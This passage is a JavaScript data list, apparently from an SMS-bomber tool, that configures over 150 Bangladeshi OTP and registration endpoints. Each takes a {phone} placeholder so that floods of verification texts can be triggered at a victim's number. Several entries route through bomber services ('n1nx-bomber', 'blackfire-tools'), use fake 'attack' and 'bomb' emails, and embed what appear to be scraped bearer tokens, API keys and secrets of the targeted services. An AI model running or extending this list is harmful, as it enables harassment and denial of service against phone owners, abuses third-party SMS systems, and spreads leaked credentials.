  { id: 1137, name: "mokam", method: "GET", url: "https://api.blackfire-tools.xyz/mokam.php?phone={phone}" },
  { id: 1138, name: "moveon", method: "GET", url: "https://api.blackfire-tools.xyz/moveon.php?phone={phone}" },
  { id: 1139, name: "mygp", method: "GET", url: "https://api.blackfire-tools.xyz/mygp.php?phone={phone}" },
  { id: 1140, name: "nbkash-gp", method: "POST", url: "https://api.blackfire-tools.xyz/nbkash-gp.php?phone={phone}" },
  { id: 1141, name: "nbkash-ra", method: "GET", url: "https://api.blackfire-tools.xyz/nbkash-ra.php?phone={phone}" },
  { id: 1142, name: "nesco (bf)", method: "GET", url: "https://api.blackfire-tools.xyz/nesco.php?phone={phone}" },
  { id: 1143, name: "niloyhero", method: "GET", url: "https://api.blackfire-tools.xyz/niloyhero.php?phone={phone}" },
  { id: 1144, name: "obhai", method: "GET", url: "https://api.blackfire-tools.xyz/obhai.php?phone={phone}" },
  { id: 1145, name: "ousodhpotro", method: "GET", url: "https://api.blackfire-tools.xyz/ousodhpotro.php?phone={phone}" },
  { id: 1146, name: "paperflay", method: "GET", url: "https://api.blackfire-tools.xyz/paperflay.php?phone={phone}" },
  { id: 1147, name: "pathao", method: "GET", url: "https://api.blackfire-tools.xyz/pathao.php?phone={phone}" },
  { id: 1148, name: "portpos", method: "GET", url: "https://api.blackfire-tools.xyz/portpos.php?phone={phone}" },
  { id: 1149, name: "pravanahelth", method: "GET", url: "https://api.blackfire-tools.xyz/pravanahelth.php?phone={phone}" },
  { id: 1150, name: "qcom", method: "GET", url: "https://api.blackfire-tools.xyz/qcom.php?phone={phone}" },
  { id: 1151, name: "quizgiri", method: "GET", url: "https://api.blackfire-tools.xyz/quizgiri.php?phone={phone}" },
  { id: 1152, name: "quiztime", method: "GET", url: "https://api.blackfire-tools.xyz/quiztime.php?phone={phone}" },
  { id: 1153, name: "redx", method: "POST", url: "https://api.blackfire-tools.xyz/redx.php?phone={phone}" },
  { id: 1154, name: "redx2", method: "GET", url: "https://api.blackfire-tools.xyz/redx2.php?phone={phone}" },
  { id: 1155, name: "reseller-circel", method: "GET", url: "https://api.blackfire-tools.xyz/reseller-circel.php?phone={phone}" },
  { id: 1156, name: "robi-ivr-dorstep", method: "GET", url: "https://api.blackfire-tools.xyz/robi-ivr-dorstep.php?phone={phone}" },
  { id: 1157, name: "robi-myoffer", method: "GET", url: "https://api.blackfire-tools.xyz/robi-myoffer.php?phone={phone}" },
  { id: 1158, name: "robi-sim", method: "GET", url: "https://api.blackfire-tools.xyz/robi-sim.php?phone={phone}" },
  { id: 1159, name: "robi-web", method: "GET", url: "https://api.blackfire-tools.xyz/robi-web.php?phone={phone}" },
  { id: 1160, name: "robi-web2", method: "GET", url: "https://api.blackfire-tools.xyz/robi-web2.php?phone={phone}" },
  { id: 1161, name: "rootsedu-forget", method: "GET", url: "https://api.blackfire-tools.xyz/rootsedu-forget.php?phone={phone}" },
  { id: 1162, name: "rootsedu-reg", method: "GET", url: "https://api.blackfire-tools.xyz/rootsedu-reg.php?phone={phone}" },
  { id: 1163, name: "rtv-forget", method: "GET", url: "https://api.blackfire-tools.xyz/rtv-forget.php?phone={phone}" },
  { id: 1164, name: "rtv-reg", method: "GET", url: "https://api.blackfire-tools.xyz/rtv-reg.php?phone={phone}" },
  { id: 1165, name: "runcash", method: "GET", url: "https://api.blackfire-tools.xyz/runcash.php?phone={phone}" },
  { id: 1166, name: "sadhin", method: "GET", url: "https://api.blackfire-tools.xyz/sadhin.php?phone={phone}" },
  { id: 1167, name: "sajgoj", method: "GET", url: "https://api.blackfire-tools.xyz/sajgoj.php?phone={phone}" },
  { id: 1168, name: "saralifestyle", method: "GET", url: "https://api.blackfire-tools.xyz/saralifestyle.php?phone={phone}" },
  { id: 1169, name: "sebaxyz", method: "GET", url: "https://api.blackfire-tools.xyz/sebaxyz.php?phone={phone}" },
  { id: 1170, name: "senorbeuty", method: "GET", url: "https://api.blackfire-tools.xyz/senorbeuty.php?phone={phone}" },
  { id: 1171, name: "sikho", method: "GET", url: "https://api.blackfire-tools.xyz/sikho.php?phone={phone}" },
  { id: 1172, name: "skitto", method: "GET", url: "https://api.blackfire-tools.xyz/skitto.php?phone={phone}" },
  { id: 1173, name: "somvob", method: "GET", url: "https://api.blackfire-tools.xyz/somvob.php?phone={phone}" },
  { id: 1174, name: "sopoth-reg", method: "GET", url: "https://api.blackfire-tools.xyz/sopoth-reg.php?phone={phone}" },
  { id: 1175, name: "sopoth-resend", method: "GET", url: "https://api.blackfire-tools.xyz/sopoth-resend.php?phone={phone}" },
  { id: 1176, name: "stedfast", method: "GET", url: "https://api.blackfire-tools.xyz/stedfast.php?phone={phone}" },
  { id: 1177, name: "sudokkho", method: "GET", url: "https://api.blackfire-tools.xyz/sudokkho.php?phone={phone}" },
  { id: 1178, name: "sundarban", method: "GET", url: "https://api.blackfire-tools.xyz/sundarban.php?phone={phone}" },
  { id: 1179, name: "talikhata", method: "GET", url: "https://api.blackfire-tools.xyz/talikhata.php?phone={phone}" },
  { id: 1180, name: "tap", method: "GET", url: "https://api.blackfire-tools.xyz/tap.php?phone={phone}" },
  { id: 1181, name: "thebodyshop", method: "GET", url: "https://api.blackfire-tools.xyz/thebodyshop.php?phone={phone}" },
  { id: 1182, name: "tota", method: "GET", url: "https://api.blackfire-tools.xyz/tota.php?phone={phone}" },
  { id: 1183, name: "toybox", method: "GET", url: "https://api.blackfire-tools.xyz/toybox.php?phone={phone}" },
  { id: 1184, name: "trusty", method: "GET", url: "https://api.blackfire-tools.xyz/trusty.php?phone={phone}" },
  { id: 1185, name: "win2gain", method: "GET", url: "https://api.blackfire-tools.xyz/win2gain.php?phone={phone}" },
  { id: 1186, name: "Babu88 Forget (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/babu88-forget.php?phone={phone}" },
  { id: 1187, name: "Babu88 Reg (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/babu88-reg.php?phone={phone}" },
  { id: 1188, name: "Bhaggo Forget (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/bhaggo-forget.php?phone={phone}" },
  { id: 1189, name: "Bhaggo Reg (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/bhaggo-reg.php?phone={phone}" },
  { id: 1190, name: "Crazy Forget (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/crazy-forget.php?phone={phone}" },
  { id: 1191, name: "Crazy Reg (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/crazy-reg.php?phone={phone}" },
  { id: 1192, name: "Krikaya Forget (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/krikaya-forget.php?phone={phone}" },
  { id: 1193, name: "Krikaya Reg (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/krikaya-reg.php?phone={phone}" },
  { id: 1194, name: "Nagad88 Forget (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/nagad88-forget.php?phone={phone}" },
  { id: 1195, name: "Nagad88 Reg (n1nx)", method: "GET", url: "https://api.n1nx-bomber.my.id/call/nagad88-reg.php?phone={phone}" },
  { id: 1196, name: "Call1 babu88-forget", method: "GET", url: "https://api.blackfire-tools.xyz/call/babu88-forget.php?phone={phone}" },
  { id: 1197, name: "Call2 babu88-reg", method: "GET", url: "https://api.blackfire-tools.xyz/call/babu88-reg.php?phone={phone}" },
  { id: 1198, name: "Call3 bhaggo-forget", method: "GET", url: "https://api.blackfire-tools.xyz/call/bhaggo-forget.php?phone={phone}" },
  { id: 1199, name: "Call4 bhaggo-reg", method: "GET", url: "https://api.blackfire-tools.xyz/call/bhaggo-reg.php?phone={phone}" },
  { id: 1200, name: "Call5 crazy-forget", method: "GET", url: "https://api.blackfire-tools.xyz/call/crazy-forget.php?phone={phone}" },
  { id: 1201, name: "Call6 crazy-reg", method: "GET", url: "https://api.blackfire-tools.xyz/call/crazy-reg.php?phone={phone}" },
  { id: 1202, name: "Call7 krikaya-forget", method: "GET", url: "https://api.blackfire-tools.xyz/call/krikaya-forget.php?phone={phone}" },
  { id: 1203, name: "Call8 krikaya-reg", method: "GET", url: "https://api.blackfire-tools.xyz/call/krikaya-reg.php?phone={phone}" },
  { id: 1204, name: "Call9 nagad88-forget", method: "GET", url: "https://api.blackfire-tools.xyz/call/nagad88-forget.php?phone={phone}" },
  { id: 1205, name: "Call10 nagad88-reg", method: "GET", url: "https://api.blackfire-tools.xyz/call/nagad88-reg.php?phone={phone}" },
  { id: 1206, name: "BTCL MyBTCL", method: "POST", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://mybtcl.btcl.gov.bd", "referer": "https://mybtcl.btcl.gov.bd/register" } },
  { id: 1207, name: "BTCL PhoneBill", method: "POST", url: "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://phonebill.btcl.com.bd", "referer": "https://phonebill.btcl.com.bd/registerBcare" } },
  { id: 1208, name: "Bioscope Plus", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+88{phone}"}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.bioscopeplus.com", "referer": "https://www.bioscopeplus.com/" } },
  { id: 1209, name: "BTCL BDIA", method: "POST", url: "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1", isFormData: true, body: { actionType: "otpSend", mobileNo: "0{phone}" } },
  { id: 1210, name: "BD Tickets JSON", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: '{"createUserCheck":true,"phoneNumber":"+88{phone}","applicationChannel":"WEB_APP"}', headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://bdtickets.com", "referer": "https://bdtickets.com/" } },
  { id: 1211, name: "Apex4U", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: '{"phoneNumber":"0{phone}"}', headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://apex4u.com", "referer": "https://apex4u.com/" } },
  { id: 1212, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: '{"phone":"0{phone}"}', headers: { "Accept": "application/json", "Content-Type": "application/json", "Origin": "https://swap.com.bd", "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=" } },
  { id: 1213, name: "Ilyn Global", method: "POST", url: "https://api.ilyn.global/auth/signup", body: '{"phone":{"code":"BD","number":"+880{phone}"},"provider":"sms"}', headers: { "accept": "application/json", "content-type": "application/json", "appcode": "ilyn-bd", "origin": "https://ilyn.global" } },
  { id: 1214, name: "Arogga Web", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10", isFormData: true, body: { mobile: "0{phone}", fcmToken: "", referral: "" } },
  { id: 1215, name: "Fundesh NoKey", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=", body: '{"msisdn":"0{phone}"}', headers: { "accept": "application/json", "content-type": "application/json; charset=UTF-8", "origin": "https://fundesh.com.bd", "referer": "https://fundesh.com.bd/fundesh/profile" } },
  { id: 1216, name: "Garibook V3", method: "POST", url: "https://api.garibookadmin.com/api/v3/user/login", body: '{"mobile":"0{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}', headers: { "accept": "application/json", "content-type": "application/json", "Origin": "https://garibook.com", "Referer": "https://garibook.com/" } },
  { id: 1217, name: "Sheba Accountkit", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: '{"mobile":"+88{phone}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}', headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "origin": "https://www.sheba.xyz", "referer": "https://www.sheba.xyz/" } },
  { id: 1218, name: "AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"88{phone}"}', headers: { "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://applink.com.bd", "Referer": "https://applink.com.bd/" } },
  { id: 1219, name: "Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{phone}", headers: { "accept": "application/json, text/plain, */*", "application-name": "web", "referer": "https://bikroy.com/?login-modal=true&redirect-url=/" } },
  { id: 1220, name: "Cinematic WAP", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/+88{phone}", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://cinematic.mobi", "Referer": "https://cinematic.mobi/", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri" } },
  { id: 1221, name: "GP Web Login DA", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", isFormData: true, body: { msisdn: "0{phone}" }, headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.grameenphone.com", "Referer": "https://www.grameenphone.com/" } },
  { id: 1222, name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: '{"mobile_no":"0{phone}"}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://ghoorilearning.com" } },
  { id: 1223, name: "DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+880{phone}"}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://www.deeptoplay.com" } },
  { id: 1224, name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", isFormData: true, body: { number: "+88{phone}" }, headers: { "accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://epharma.com.bd", "x-requested-with": "XMLHttpRequest" } },
  { id: 1225, name: "Sailor Clothing", method: "POST", url: "https://backend.sailor.clothing/api/v2/auth/password/forget_request", body: '{"email_or_phone":"0{phone}","send_code_by":"phone"}', headers: { "accept": "application/json", "content-type": "application/json", "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr" } },
  { id: 1226, name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", isFormData: true, body: { phone: "0{phone}", email: "test@gmail.com" } },
  { id: 1227, name: "MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/,", headers: { "accept": "application/json", "origin": "https://medeasy.health", "referer": "https://medeasy.health/" } },
  { id: 1228, name: "Osudpotro (alt)", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}', headers: { "accept": "application/json", "content-type": "application/json;charset=UTF-8", "authorization": "Bearer undefined", "origin": "https://osudpotro.com" } },
  { id: 1229, name: "TheClinicall", method: "POST", url: "https://theclinicall.com/bkapi/auth/user/otp/signin", body: '{"countryCode":"BD","dialCode":"880","phone":"{phone}"}', headers: { "accept": "application/json", "content-type": "application/json", "authorization": "Bearer Hello", "origin": "https://www.theclinicall.com" } },
  { id: 1230, name: "Shombhob", method: "POST", url: "https://shombhob.com/api/otp-login", body: '{"phone":"0{phone}"}', headers: { "accept": "application/json", "content-type": "application/json", "origin": "https://shombhob.com", "x-requested-with": "XMLHttpRequest" } },
  { id: 1231, name: "Care Box", method: "POST", url: "https://www.api-care-box.click/api/user/register/?version=otp", body: '{"Name":"Rakib Khan","Phone":"+880{phone}"}', headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.care-box.com" } },
  { id: 1232, name: "Renix Care", method: "POST", url: "https://renixapi.renixcare.com/sms-api/send-otp", body: '{"phone":"0{phone}"}', headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://renixcare.com" } },
  { id: 1233, name: "Jayabaji Check Username", method: "POST", url: "https://www.jayabaji3.com/api/register/check-username", body: '{"username":"sojib12345","email":"","mobileno":"{phone}","language":"bn","langCountry":"bn-bd"}', headers: { "accept": "application/json", "content-type": "application/json", "device": "desktop", "domain": "www.jayabaji3.com", "lang": "bn-bd", "origin": "https://www.jayabaji3.com" } },
  { id: 1234, name: "PKLuck2 Register", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/register", body: '{"countryDialingCode":"880","mobileNo":"0{phone}"}', headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Device": "web", "Language": "BN", "Merchant": "pklubdtf4", "Origin": "https://www.pkluck2.com" } },
  { id: 1235, name: "PKLuck2 NoLogin", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: '{"mobileNum":"0{phone}","countryDialingCode":"880"}', headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Device": "web", "Language": "BN", "Merchant": "pklubdtf4", "Origin": "https://www.pkluck2.com" } },
  { id: 1236, name: "GP Flexiplan", method: "POST", url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", body: '{"payment_mode":"mobile_balance","longevity":1,"voice":100,"data":0,"fourg":0,"bioscope":0,"sms":0,"mca":0,"price":69,"msisdn":"0{phone}","bundle_id":60817,"is_login":false}', headers: { "Accept": "application/json, text/plain, */*", "Authorization": "Bearer null", "Content-Type": "application/json", "Origin": "https://www.grameenphone.com" } },
  { id: 1237, name: "GP FWA (fi)", method: "POST", url: "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", body: '{"phone":"0{phone}","email":"","language":"en"}', headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://gpfi.grameenphone.com" } },
  { id: 1238, name: "Mevrik", method: "POST", url: "https://channels.mevrik.com:4202/api/v1/claim-session", body: '{"data":{"user_ref":"0{phone}","name":"MD Hossain"}}', headers: { "Accept": "application/json", "Content-Type": "text/plain", "Origin": "https://chat.mevrik.com:4213", "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE" } },
  { id: 1239, name: "Priyoshikkhaloy form", method: "POST", url: "https://app.priyoshikkhaloy.com/api/user/register-login.php", isFormData: true, body: { mobile: "0{phone}" }, headers: { "User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1240, name: "Doctime Firebase", method: "POST", url: "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", body: '{"data":{"country_calling_code":"88","contact_no":"{phone}","headers":{"PlatForm":"Web"}}}', headers: { "Content-Type": "application/json" } },
  { id: 1241, name: "Sundarban GraphQL", method: "POST", url: "https://api-gateway.sundarbancourierltd.com/graphql", body: '{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation{createAccessToken(accessTokenFilter:{userName:\\"{phone}\\"}){message}}"}', headers: { "Content-Type": "application/json" } },
  { id: 1242, name: "Robi Doorstep", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"doorstep"}', headers: { "Content-Type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc" } },
  { id: 1243, name: "Banglalink Validate", method: "GET", url: "https://web-api.banglalink.net/api/v1/user/number/validation/{phone}" },
  { id: 1244, name: "Banglalink OTP", method: "POST", url: "https://web-api.banglalink.net/api/v1/user/otp-login/request", body: '{"mobile":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1245, name: "GP OTP (webloginda)", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", isFormData: true, body: { msisdn: "{phone}" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1246, name: "Robi MyOffer", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"my_offer"}', headers: { "Content-Type": "application/json" } },
  { id: 1247, name: "Robi DA NLL", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: '{"msisdn":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1248, name: "Robi Video Chat", method: "POST", url: "https://webapi.robi.com.bd/v1/chat/send-otp", body: '{"phone_number":"{phone}","name":"BILLAVAI","type":"video-chat"}', headers: { "Content-Type": "application/json" } },
  { id: 1249, name: "Redx Merchant OTP", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: '{"phoneNumber":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1250, name: "Motionview OTP Signup", method: "POST", url: "https://api.motionview.com.bd/api/send-otp-phone-signup", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1251, name: "Chorki Login Web", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", body: '{"number":"+88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1252, name: "Jatri Send OTP", method: "POST", url: "https://user-api.jslglobal.co:444/v2/send-otp", body: '{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}', headers: { "Content-Type": "application/json" } },
  { id: 1253, name: "ChinaOnlineBD", method: "GET", url: "https://chinaonlinebd.com/api/login/getOtp?phone={phone}", headers: { "token": "45601f3d391886fcec5f5a3f26780f21" } },
  { id: 1254, name: "Shikho Send SMS", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone}","type":"student","auth_type":"signup"}', headers: { "Content-Type": "application/json" } },
  { id: 1255, name: "Bioscope GET", method: "GET", url: "https://www.bioscopelive.com/en/login/send-otp?phone=88{phone}&operator=bd-otp" },
  { id: 1256, name: "Chokrojan Mobile", method: "POST", url: "https://chokrojan.com/api/v1/passenger/login/mobile", body: '{"mobile_number":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1257, name: "Easy Forgot", method: "POST", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", body: '{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1258, name: "Walton Plaza PHP", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: '{"auth":{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone}"},"captchaToken":"recapcha"}', headers: { "Content-Type": "application/json" } },
  { id: 1259, name: "Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone}","otp_type":"login"}', headers: { "Content-Type": "application/json" } },
  { id: 1260, name: "AWS OTP", method: "POST", url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1261, name: "Otithee", method: "POST", url: "https://gateway.otithee.com/api/v1/generate-otp", body: '{"request_type":"registration","mobile_number":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1262, name: "Mojaru Student", method: "POST", url: "https://new.mojaru.com/api/student/login", body: '{"mobile_or_email":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1263, name: "GP AppCity", method: "POST", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", body: '{"mobileNumber":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1264, name: "BD Matrimony", method: "GET", url: "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}" },
  { id: 1265, name: "Upay Wallet Init", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: '{"wallet_number":"{phone}","geo_location":{"lat":23.89,"long":89.13},"referral":"","firebase_token":"dummy","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}', headers: { "Content-Type": "application/json" } },
  { id: 1266, name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: '{"phone":"{phone}","intent":"login"}', headers: { "Content-Type": "application/json" } },
  { id: 1267, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-login", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1268, name: "Shikho Public", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: '{"phone":"{phone}","intent":"ap-discount-request"}', headers: { "Content-Type": "application/json" } },
  { id: 1269, name: "Ostad", method: "POST", url: "https://api.ostad.app/api/v2/user/with-otp", body: '{"msisdn":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1270, name: "iEducation", method: "POST", url: "https://www.ieducationbd.com/api/account/check_user", body: '{"mobile":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1271, name: "Hishabee", method: "GET", url: "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}" },
  { id: 1272, name: "Roots Edu Register", method: "POST", url: "https://rootsedulive.com/api/auth/register", body: '{"name":"BILLAVAI","phone":"88{phone}","email":"temp{phone}@bomb.bd","password":"Secure@2025","confirmPassword":"Secure@2025"}', headers: { "Content-Type": "application/json" } },
  { id: 1273, name: "Roots Edu Forget", method: "POST", url: "https://rootsedulive.com/api/auth/forget-password", body: '{"phoneOrEmail":"88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1274, name: "MithaiBD", method: "POST", url: "https://mithaibd.com/api/login/", body: '{"company_id":"2","phone":"{phone}","email":"attack{phone}@mail.com","password1":"pass123","otp_verify":false}', headers: { "Content-Type": "application/json" } },
  { id: 1275, name: "English Moja", method: "POST", url: "https://api.englishmojabd.com/api/v1/auth/login", body: '{"phone":"+88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1276, name: "Moveon OTP", method: "POST", url: "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1277, name: "MyGP Cinematic GET", method: "GET", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/" },
  { id: 1278, name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: '{"mobileNumber":"+88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1279, name: "Circle Reseller Signup", method: "POST", url: "https://reseller.circle.com.bd/api/v2/auth/signup", body: '{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}', headers: { "Content-Type": "application/json" } },
  { id: 1280, name: "Shomvob Bearer", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", body: '{"phone":"{phone}"}', headers: { "Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" } },
  { id: 1281, name: "Toybox", method: "POST", url: "https://api.toybox.live/bdapps_handler.php", isFormData: true, body: { Operation: "CreateSubscription", MobileNumber: "88{phone}", PackageID: "100", Secret: "HJKX71%UHYH" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1282, name: "Win2gain", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}", headers: { "sourcePlatform": "web", "client": "2" } },
  { id: 1283, name: "BD Kepler", method: "POST", url: "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", body: '{"deviceId":"prodevice","operator":"Gp","walletNumber":"{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1284, name: "GP BkWebsite", method: "POST", url: "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", body: '{"msisdn":"{phone}"}', headers: { "Content-Type": "application/json", "lang": "en" } },
  { id: 1285, name: "BdStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", isFormData: true, body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1286, name: "BCS Examaid", method: "POST", url: "https://bcsexamaid.com/api/generateotp", body: '{"mobile":"{phone}","softtoken":"Rifat.Admin.2022"}', headers: { "Content-Type": "application/json" } },
  { id: 1287, name: "DoctorLiveBD", method: "POST", url: "https://doctorlivebd.com/api/patient/auth/otpsend", isFormData: true, body: { country_code: "880", mobile: "{phone}" }, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
  { id: 1288, name: "Sindabad", method: "POST", url: "https://offers.sindabad.com/api/mobile-otp", body: '{"key":"c94e67fb2a59af3b6fa21f24463b2061","mobile":"+88{phone}"}', headers: { "Content-Type": "application/json" } },
  { id: 1289, name: "KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone}"}', headers: { "Content-Type": "application/json" } },
